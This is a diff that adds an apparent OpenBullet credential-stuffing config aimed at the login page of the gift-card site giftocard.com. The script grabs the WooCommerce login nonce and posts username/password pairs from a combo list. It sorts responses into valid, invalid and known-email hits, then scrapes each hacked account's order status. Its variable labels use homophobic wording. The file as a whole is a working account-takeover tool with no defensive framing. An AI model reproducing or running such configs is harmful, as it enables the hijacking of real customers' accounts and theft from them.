@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "giftocard",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-04T10:34:57.1953555+00:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 0,
+      "RuleString": "Lowercase",
+      "Id": 1933489418
+    },
+    {
+      "SliceName": "USER",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 1066223859
+    },
+    {
+      "SliceName": "USER",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 332834773
+    },
+    {
+      "SliceName": "USER",
+      "RuleType": 0,
+      "RuleString": "Symbol",
+      "Id": 386025756
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#HomoSexualPantherGET REQUEST GET "https://www.giftocard.com/my-account/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualPantherGET FUNCTION Constant "<USER>" -> VAR "HOMO" 
+#HomoSexualPantherHOMO FUNCTION Constant "<PASS>" -> VAR "SEXUAL" 
+#HomoSexualPantherHOMOSEXUAL PARSE "<SOURCE>" CSS "[name=woocommerce-login-nonce]" "value" 0 -> VAR "HOMOSEXUAL" "" "" 
+#HomoSexualPantherPOST REQUEST POST "https://www.giftocard.com/my-account/" AutoRedirect=TRUE 
+  CONTENT "username=<HOMO>&password=<SEXUAL>&woocommerce-login-nonce=<HOMOSEXUAL>&_wp_http_referer=%2Fmy-account%2F&login=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualMINESWEEPER KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username" 
+  KEYCHAIN Success OR 
+    KEY "Log Out" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "The password you entered for the email address " 
+#HomoSexualPantherORDERS REQUEST GET "https://www.giftocard.com/my-account/orders/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualPantherORDER-STATUS PARSE "<SOURCE>" LR "Go shop		</a>" "</div>" Recursive=FALSE -> CAP "Orders" "" "" 
